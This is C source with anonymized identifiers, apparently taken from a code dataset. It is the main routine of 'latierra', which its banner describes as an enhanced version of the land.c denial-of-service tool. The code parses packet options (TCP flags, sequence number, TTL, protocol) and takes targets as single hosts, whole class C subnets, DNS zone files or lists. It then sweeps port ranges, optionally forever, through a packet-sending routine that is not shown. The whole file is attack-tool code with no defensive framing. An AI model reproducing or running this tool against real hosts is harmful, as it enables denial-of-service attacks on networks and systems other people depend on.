
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int tcp_flags; int window_size; int ip_protocol; int sequence_number; int ttl; char* dest_ip; void* supress_output; void* message_type; } ;
typedef TYPE_1__ LATIERRA_DATA ;
typedef int FILE ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 void* VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 void* VAR_16 ;
 int VAR_17 ;
 scalar_t__ FUNC_0 (char*,int ) ;
 int FUNC_1 () ;
 void* FUNC_2 (int*) ;
 int * FUNC_3 (char*,char*) ;
 int FUNC_4 (int ,char*) ;
 int FUNC_5 (int,int *,char*) ;
 int FUNC_6 (int,char**,char*) ;
 scalar_t__ FUNC_7 (TYPE_1__*,int) ;
 int FUNC_8 () ;
 int* VAR_18 ;
 int FUNC_9 () ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 () ;
 int FUNC_12 (int) ;
 int FUNC_13 (char*,char*,char*,int) ;
 int VAR_19 ;
 int FUNC_14 (char*,char*) ;
 int FUNC_15 (char*,char*) ;
 int FUNC_16 (char*,...) ;
 int FUNC_17 (int*) ;
 scalar_t__ FUNC_18 (int*,char*,int) ;

int FUNC_19(int VAR_20, char **VAR_21)
{
 FILE *VAR_22;
 LATIERRA_DATA VAR_23;
 int VAR_24 = VAR_0, VAR_25;
 int VAR_26=1, VAR_27=1, VAR_28=0, VAR_29=0, VAR_30=VAR_6;
 int VAR_31 = 0, VAR_32 = VAR_16, VAR_33 = 0, VAR_34 = VAR_6;
   char VAR_35 = VAR_6, VAR_36 = VAR_6;
 char VAR_37[21], VAR_38[256], VAR_39[512], VAR_40[16];

 FUNC_10("\nlatierra v1.0b by MondoMan (elmondo@usa.net), KeG\n");
   FUNC_10("Enhanced version of land.c originally developed by m3lt, FLC\n");

 FUNC_16(VAR_40, "fsrpau");
 VAR_23.tcp_flags = 0;
 VAR_23.window_size = VAR_4;
 VAR_23.ip_protocol = VAR_8;
 VAR_23.sequence_number = VAR_1;
 VAR_23.ttl = VAR_3;
 VAR_23.message_type = 0;

 if(VAR_20 > 1 && (!FUNC_15(VAR_21[1], "-a")))
  FUNC_1();

 if(VAR_20 > 1 && (!FUNC_15(VAR_21[1], "-n")))
  FUNC_8();

 if(VAR_20 > 1 && (!FUNC_15(VAR_21[1], "-p")))
  FUNC_11();

 if(VAR_20 == 1 || ( (VAR_20 >= 2) && (!FUNC_15(VAR_21[1], "-h"))))
  FUNC_9();

 while((VAR_33 = FUNC_6(VAR_20, VAR_21, "i:b:e:s:l:o:t:w:p:q:v:m:")) != VAR_5)
  {
  switch(VAR_33)
   {
   case 't':
    for(VAR_25=0;VAR_25<FUNC_17(VAR_18);VAR_25++)
     switch(VAR_18[VAR_25])
      {
      case 'f':
       VAR_23.tcp_flags |= VAR_11;
       break;
      case 's':
       VAR_23.tcp_flags |= VAR_14;
       break;
      case 'r':
       VAR_23.tcp_flags |= VAR_13;
       break;
      case 'p':
       VAR_23.tcp_flags |= VAR_12;
       break;
      case 'a':
       VAR_23.tcp_flags |= VAR_10;
       break;
      case 'u':
       VAR_23.tcp_flags |= VAR_15;
       break;
      default:
       FUNC_10("\nERROR: Invalid option specified [ %c ] for tcp_flags.\n\n", VAR_18[VAR_25]);
       return(-12);
       break;
      }
    break;
   case 'q':
    VAR_23.sequence_number = FUNC_2(VAR_18);
    break;
   case 'w':
    VAR_23.window_size = FUNC_2(VAR_18);
    break;
   case 'm':
    VAR_23.message_type = FUNC_2(VAR_18);
    break;
   case 'v':
    VAR_23.ttl = FUNC_2(VAR_18);
    break;
   case 'p':
    VAR_23.ip_protocol = FUNC_2(VAR_18);
    break;
   case 'o':
    VAR_23.supress_output = VAR_16;
    break;
   case 'i':
    if(FUNC_17(VAR_18) > 1)
     FUNC_16(VAR_23.dest_ip, VAR_18);
    else
     {
     FUNC_10("ERROR: Must specify valid IP or hostname.\n");
     return(-6);
     }
    VAR_35 = VAR_16;
    break;
   case 's':
    VAR_24 = FUNC_2(VAR_18);
    break;
   case 'l':
    VAR_32 = FUNC_2(VAR_18);
    break;
   case 'b':
    VAR_26 = FUNC_2(VAR_18);
    VAR_36 = VAR_16;
    break;
   case 'e':
    VAR_31 = FUNC_2(VAR_18);
    break;
   }
  }

 if(!VAR_23.tcp_flags)
  VAR_23.tcp_flags = VAR_2;

 if(!VAR_36)
  {
  FUNC_4(VAR_19, "\nMust specify beginning port number.  Use -h for help with arguments.\n\n");
  return(-7);
  }

 if(VAR_31 == 0)
  VAR_31 = VAR_26;

 FUNC_10("\nSettings:\n\n");

   FUNC_10("  (-i)   Dest. IP Addr   : ");

 if(VAR_23.dest_ip[FUNC_17(VAR_23.dest_ip) -1] == '-')
  {
  VAR_23.dest_ip[FUNC_17(VAR_23.dest_ip)-1] = 0x0;
  FUNC_16(VAR_37, VAR_23.dest_ip);
  FUNC_14(VAR_23.dest_ip, "1");
  FUNC_10(" %s (Class C range specified).\n", VAR_23.dest_ip);
  VAR_34 = VAR_16;
  VAR_27 = 1;
  }
 else
  if(FUNC_17(VAR_23.dest_ip) > 5)
   {
   if(FUNC_18(VAR_23.dest_ip, "zone=", 5)==0)
    {
    FUNC_16(VAR_38, &VAR_23.dest_ip[5]);
    FUNC_10("%s (using DNS zone file)\n", VAR_38);
    VAR_30 = VAR_17;
    }
   else if(FUNC_18(VAR_23.dest_ip, "list=", 5) == 0)
    {
    FUNC_16(VAR_38, &VAR_23.dest_ip[5]);
    FUNC_10("%s (using ASCII list)\n", VAR_38);
    VAR_30 = VAR_9;
    }
   else
    FUNC_10("%s\n", VAR_23.dest_ip);
   }
  else
   {
   FUNC_10("Destination specifier (%s) length must be > 7.\n", VAR_23.dest_ip);
   return(-9);
   }

 FUNC_10("  (-b)   Beginning Port #: %d\n", VAR_26 );
 FUNC_10("  (-e)   Ending Port #   : %d\n", VAR_31 );
 FUNC_10("  (-s)   Seconds to Pause: %d\n", VAR_24 );
 FUNC_10("  (-l)   Loop            : %d %s\n", VAR_32, (VAR_32 == VAR_7) ? "(forever)" : " " );
 FUNC_10("  (-w)   Window size     : %d\n", VAR_23.window_size );
 FUNC_10("  (-q)   Sequence Number : %X (%d)\n",VAR_23.sequence_number, VAR_23.sequence_number );
 FUNC_10("  (-v)   Time-to-Live    : %d\n", VAR_23.ttl);
 FUNC_10("  (-p)   IP Protocol #   : %d\n", VAR_23.ip_protocol );
 FUNC_10("  (-t)   TCP flags       : ");

 FUNC_16(VAR_39, "");

 if( VAR_23.tcp_flags & VAR_11)
  FUNC_14(VAR_39, "fin ");
 if( VAR_23.tcp_flags & VAR_14)
  FUNC_14(VAR_39, "syn ");
 if(VAR_23.tcp_flags & VAR_13)
  FUNC_14(VAR_39, "rst ");
 if(VAR_23.tcp_flags & VAR_12)
  FUNC_14(VAR_39, "push ");
 if(VAR_23.tcp_flags & VAR_10)
  FUNC_14(VAR_39, "ack ");
 if(VAR_23.tcp_flags & VAR_15)
  FUNC_14(VAR_39, "urg ");

 FUNC_10("%s\n\n", VAR_39);

 if(VAR_31 < VAR_26)
  {
  FUNC_10("\nERROR: Ending port # must be greater than beginning port #\n\n");
  return(-8);
  }

 VAR_28 = VAR_29 = VAR_32;

 if(VAR_30)
  {
  if(FUNC_0(VAR_38, 0))
   {
   FUNC_10("\nERROR: The file you specified (%s) cannot be found.\n\n", VAR_38);
   return(-9);
   }

  if( (VAR_22 = FUNC_3(VAR_38, "rt")) == ((void*)0))
   {
   FUNC_10("ERROR: Unable to open %s.\n", VAR_38);
   return(-10);
   }

  if(!FUNC_5(VAR_30, VAR_22, VAR_39))
   {
   FUNC_10("Unable to get any IP address from file %s.\n");
   return(-11);
   }

  FUNC_16(VAR_23.dest_ip, VAR_39);
  }

 while( (VAR_32 == VAR_7) ? 1 : VAR_32-- > 0)
  {
  for(VAR_33=VAR_26; VAR_33 <= VAR_31; VAR_33++)
   {
   if(FUNC_7(&VAR_23, VAR_33))
    break;

     if(VAR_24)
     {
    if(!VAR_23.supress_output)
     FUNC_10("-> paused %d seconds.\n", VAR_24);
    FUNC_12(VAR_24);
    }
   }

  if( (!VAR_30) && (VAR_32 && VAR_34) )
   {
   char VAR_41[21];

   if(++VAR_27 > 254)
    {
    if(VAR_29 != VAR_7)
     {
     if(++VAR_28 > VAR_29)
      break;
     else
      VAR_32 = VAR_29;
     }
    VAR_27 = 1;
    }

   FUNC_13(VAR_41, "%s%d", VAR_37, VAR_27);
   FUNC_16(VAR_23.dest_ip, VAR_41);

   if(!VAR_23.supress_output)
    FUNC_10("** incrementing to next IP address: %s\n", VAR_23.dest_ip);

   if(VAR_28 > VAR_29)
    break;
   }
  else if(VAR_30)
   {
   if(!FUNC_5(VAR_30, VAR_22, VAR_39))
    break;

   VAR_32++;

   FUNC_16(VAR_23.dest_ip, VAR_39);
   }

  }

 FUNC_10("\nDone.\n\n");
}
